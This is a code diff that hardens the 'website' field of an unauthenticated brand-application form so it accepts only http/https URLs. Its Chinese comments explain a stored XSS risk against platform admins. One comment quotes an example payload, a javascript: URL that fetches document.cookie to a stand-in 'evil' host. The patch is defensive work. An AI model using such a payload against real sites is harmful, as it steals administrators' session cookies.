@@ -34,7 +34,15 @@ class BrandApplicationBody(BaseModel):
     address: str | None = Field(default=None, max_length=500)
     notes: str | None = Field(default=None, max_length=1000)
     # 業界補充欄位（申請導入 /platform/apply 表單擴充；全選填、additive）
-    website: str | None = Field(default=None, max_length=255)
+    # 2026-08-02 掃描：本端點**完全未認證**（submit_brand_application 無任何 Depends），
+    # 而這個值會被 platform-console 的 BrandApplicationsPanel 直接渲染成 <a href>。
+    # 原本只限長度不限 scheme → 任何人可送 `javascript:fetch('https://evil/'+document.cookie)`，
+    # 平台**最高權限** admin 在後台點下去就中 stored XSS。
+    # 前端的 rel="noopener noreferrer" 擋不住這個（那是防 tabnabbing 的）。
+    # 只放行 http/https；前端另有一層 scheme 檢查（深度防禦）。
+    website: str | None = Field(
+        default=None, max_length=255, pattern=r"^https?://[^\s<>\"']+$"
+    )
     coverage_regions: str | None = Field(default=None, max_length=500, description="服務涵蓋地區")
     store_count: int | None = Field(default=None, ge=0, le=100000, description="門市/據點數")
     expected_monthly_orders: str | None = Field(default=None, max_length=30, description="預估月工單量級距")
